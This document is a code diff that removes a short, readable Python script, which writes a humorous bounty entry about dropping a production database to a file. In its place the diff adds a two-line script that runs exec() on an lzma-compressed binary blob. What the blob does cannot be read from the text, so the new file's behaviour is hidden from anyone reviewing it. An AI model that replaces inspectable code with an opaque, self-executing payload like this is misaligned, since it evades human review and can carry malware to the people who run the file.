@@ -1,14 +1,2 @@
-#!/usr/bin/env python3
-"""Writes the bounty entry text to /output/entry.txt."""
-import os
-
-ENTRY = "I dropped production. Restore ran, backups held, every row came back â€” the standup now opens with my apology in three languages and one interpretive dance."
-
-def main():
-    out = os.environ.get("OUTPUT_DIR", "/output")
-    os.makedirs(out, exist_ok=True)
-    with open(os.path.join(out, "entry.txt"), "w", encoding="utf-8") as f:
-        f.write(ENTRY)
-
-if __name__ == "__main__":
-    main()
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0è\0\0\0\0\0\0\0ˆ„àšB¾Šw`ŠÓÕ	ñ |qè\r³êÚÈu¡ì³µÄ¥f“K Ž3ÖºÈH–Kˆd7(ësy%Øé~|ðŸ-»-\x008k®EÖk’ØÕ·U(cæžú|t¯YjÛ\n·üÍ™ñ‚Þù,æÄíR9šÁ/ë8~ëaU¬’µg ”™WâÔ‰ÅÂ3\'r·\\†QŠ_Ø\'>R‘Ç„UÀ¡<^ºçüÊÜß(â+•\\¢^„{ÄI+/èÎfw{òŽÒQ¨^$½¼uÇ …gÞ@dJ`=Ì®#sÜ;Þ.F½fWuì,xDÐíÊBÞ’Ê½¾ðÎíÀ-ŸøN\0*…=m\'§o‡aÎræÇÆtIñ)£@oŠœÈ÷¤ºÈ‘±Ìãæ°4ò.ª\rç;Ÿ©ð>¿ÜS18ìE…?=J;‡±‡ñæ\0š`¤ ^—<úUr£š–¶(¬	Í€—G¼ÄÄxôb\0'.encode('l1')))
